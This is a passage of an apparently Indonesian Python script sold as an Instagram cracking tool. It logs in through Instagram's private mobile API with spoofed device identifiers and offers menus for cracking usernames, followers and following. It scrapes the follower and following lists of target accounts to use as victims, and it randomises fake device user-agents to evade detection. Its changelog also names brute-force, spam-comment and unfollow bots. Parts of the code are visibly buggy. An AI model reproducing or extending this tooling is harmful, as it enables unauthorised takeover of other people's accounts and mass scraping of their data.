der_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'
	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()
	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]
	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')
	def loginAPI(self):
		token=self.s.get("https:/i.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data))
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''
class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
		self.tol = Console()
		self.pwa=[]
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			banner()
			self.mentod()
			urut=[]
			luciku=[]
		#	urut.append(Panel(f"{P2}Nama      : {H2}{nama}\n{P2}Username  : {H2}{self.username}\n",title=f"{M2}• {K2}• {H2}•{P2} {P2}Data {H2}• {K2}• {M2}•",width=80,padding=(0,3),style=f"{color_table}"))
			prints(Panel(f"{P2}\t     𝚂𝚎𝚕𝚊𝚖𝚊𝚝 𝙳𝚊𝚝𝚊𝚗𝚐 {H2}{nama}{P2} 𝙳𝚒 𝚃𝚘𝚘𝚕𝚜 {M2}𝙻𝚞𝚌𝚒𝚟𝚎𝚛𝚇𝚙𝚕𝚘𝚒𝚝 ",width=80,style=f"{color_table}"))
			luciku.append(Panel(f"{P2}[{B2}01{P2}]. 𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 {H2}𝙲𝚛𝚊𝚌𝚔 \n{P2}[{B2}02{P2}]. 𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 {H2}𝙲𝚛𝚊𝚌𝚔 \n{P2}[{B2}03{P2}]. 𝙵𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 {H2}𝙲𝚛𝚊𝚌𝚔 ",width=40,padding=(0,3),style=f"{color_table}"))
			luciku.append(Panel(f"{P2}[{B2}04{P2}]. 𝚁𝚎𝚜𝚞𝚕𝚝 {H2}𝙲𝚛𝚊𝚌𝚔 {K2}𝙲𝙷𝙴𝙲𝙺𝙿𝙾𝙸𝙽𝚃 \n{P2}[{B2}05{P2}]. 𝚁𝚎𝚜𝚞𝚕𝚝 {H2}𝙲𝚛𝚊𝚌𝚔 \n{P2}[{M2}E{P2}]. {M2}𝙻𝚘𝚐𝙾𝚞𝚝",width=40,padding=(0,3),style=f"{color_table}"))
			self.tol.print(Columns(luciku))
	def BUG(self):
		jalan(f"㋛ Tunggu Sedang Proses Menuju WhatsApp Admin");time.sleep(5);os.system("xdg-open https://wa.me/+6283133662280?");time.sleep(5);exit()
	
	def mentod(self):
		for i in external:
			nama = i.split('|')[0]
			followers = i.split('|')[1]
			following = i.split('|')[2]
		try:
			ses=requests.Session()
			lisen=open('.lisen.txt','r').read().splitlines()
			met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyODk1MzkwMyIsImVUdmdBNEZpL0RyVEFReFFwVTBhMzhaelBIaHZJbHhWQkZSSUdHRVoiXQ==&ProductId=17514&Key='+lisen).json()
			men = met['licenseKey']
			key = men['key'][0:16]
			tahun = men['expires'][0:4]
			buln = men['expires'][5:7]
			tanggal=men['expires'][8:10]
			bulan = bulan_ttl[buln]
			tahun1 = men['created'][0:4]
			buln1 = men['created'][5:7]
			tanggal1 = men['created'][8:10]
			bulan1=bulan_ttl[buln1]
			#urut.append(Panel(f"{P2}Pengikut : {followers}\n{P2}Mengikuti: {following}",padding=(0,10), style=f"{color_table}"))
			#self.tol.print(Columns(urut))
		except:
			key = ""
			tanggal = ""
			bulan = ""
			tahun = ""
			tanggal1= ""
			bulan1 = ""
			tahun1 = ""
			urut=[]
			print(f"{P} NAMA <•> {HI}{nama}\n{P} USERNAME <•> {HI}{self.username}")
		#	urut.append(Panel(f"{P2}Nama      : {H2}{nama}\n{P2}Username  : {H2}{self.username}\n{P2}Pengikut  : {H2}{followers}\n{P2}Mengikuti : {H2}{following}",title=f"{M2}• {K2}• {H2}•{P2} {M2}Pengguna {H2}• {K2}• {M2}•",width=80,padding=(0,3),style=f"bold green"))
			#urut.append(Panel(f"{P2}Pengikut : {P2}{followers}\n{P2}Mengikuti: {following}",padding=(0,10), style=f"{color_table}"))
			self.tol.print(Columns(urut))
	def ChangeLog(self):
		io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur yang di update'))
		io='[1] Bot unfollow instagram\n[2] Bot spam komen'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur tambahan'))
		io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fix Bug'))
		exit()
	def Exit(self):
		prints(Panel(f"[white]Apakah anda yakin ingin keluar ?",width=50,padding=(0,4),style=f"{color_table}"))
		x=input(f'{N}• Jawaban [y/t] : {C}')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			jalan(f'• Berhasil Keluar Silakan Ketik Ulang Perintah Scriptnya');time.sleep(2);exit()
		elif x in ('t','T'):
			jalan(f'• Kembali Ke Menu Utama Tubg');time.sleep(5);self.menu()
		else:
			self.menu()
	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={six_id}&rrank_token=0.35875757839675004&include_reel=true"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid
	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=uuid.uuid4()
		guid=uuid.uuid4().hex[:32]
		xx=self.s.get(f'https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid={guid}').cookies['csrftoken']
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})
		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': xx})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			str(uuid.uuid4()),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
	def searchAPI(self,cookie,nama):
		try:
			for ba in range(100):
				x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.35875757839675004&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						user=i['user']
						username=user['username']
						fullname=user['full_name']
						internal.append(f'{username}|{fullname}')
					sys.stdout.write(f"\r{H}•{N} Sedang Mengumpulkan {H}{len(internal)}")
					sys.stdout.flush()
					time.sleep(0.0002)
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
		except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit(f'\n{M}[!] Koneksi internet bermasala;h{C}')
		except (KeyError, UnboundLocalError):
				exit(f"{N}[{M}!{N}] gagal mengambil username, kemungkinan username tidaklah publik")
		except KeyboardInterrupt:
				pass
		return internal
	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
			except (json.decoder.JSONDecodeError, KeyError, AttributeError):
				exit(f"{M}[!] Cookie checkpoint{N}")
			except Exception as e:
				exit(f"{M}[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
			return idx
		else:register_device()
	def infoAPI(self,cookie,api,id,user):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							sys.stdout.write(f"\r{H}•{N} Sedang Mengumpulkan {H}{len(internal)} {H}{username}")
							sys.stdout.flush()
							time.sleep(0.0002)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
			except (UnboundLocalError, ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
				exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik/ Tumbal anda mati")
			except KeyboardInterrupt:
				pass
			return internal
		else:register_device()
	def ifoAPI(self,cookie,api,id,user):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							sys.stdout.write(f"\r{H}•{N} Sedang Mengumpulkan {H}{len(internal)} {H}{username}")
							sys.stdout.flush()
							time.sleep(0.0002)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit(f'\n{M}┣[!] Koneksi internet bermasala;h{C}')
			except (UnboundLocalError, ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
				exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik/ Tumbal anda mati")
			except KeyboardInterrupt:
				pass
			return internal
		else:register_device()
		
	def User_Ganet(self):
		rr=random.randint
		rc=random.choice
		samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
		real = random.choice(samsung).split('|')
		com=rc(["qcom","mt6833","mt6765","samsungexynos7580","samsungexynos8895","samsungexynos7880","universal5420","samsungexynos8895"])
		comi="in_ID"
		dpis = rc(['640dpi','320dpi','480dpi','560dpi','240dpi','540dpi','306dpi','356dpi','280dpi'])
		b1 = random.choice(['OPM1','OPM2','OPM3','OPM4','OPM5','OPM6','OPD1','QD1A','OPR6','TPR1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1','LRX22C','GWK74','R16NW','FROYO','JZO54K','JSS15J','GRWK74','KOT49H','MMB29M','IMM76D','KTU84P','JDQ39','LMY47X','NMF26X','M1AJQ','GINGERBREAD'])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688","1080x1920","720x1280","1080x2076","1440x2768","1440x2368"])
		igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182")
		igve=igv.split(",")
		infinix=rc(["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"])
		andro = rc(['23/6.0.1','24/7.0','22/5.1.1','26/8.0.0','17/4.2.2','19/4.4.2','25/7.1.1','21/5.0','28/9','34/14','33/13','30/11','29/10']) 
		versi=rc(igve)
